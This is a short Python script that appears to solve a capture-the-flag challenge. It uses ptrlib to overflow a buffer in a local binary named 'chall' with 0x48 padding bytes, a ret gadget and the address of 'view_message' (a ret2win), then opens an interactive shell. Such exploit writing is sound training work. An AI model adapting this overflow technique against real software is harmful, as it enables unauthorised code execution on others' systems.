"""
BOF and ret2win
"""

from ptrlib import *

file = "./chall"
e = ELF(file)
sock = Process(file)
sock.debug = True

rop_ret = 0x0040101a

payload = b"A" * 0x48
payload += p64(rop_ret)
payload += p64(e.symbol("view_message"))
sock.sendlineafter("PIN: ", payload)

sock.sh()
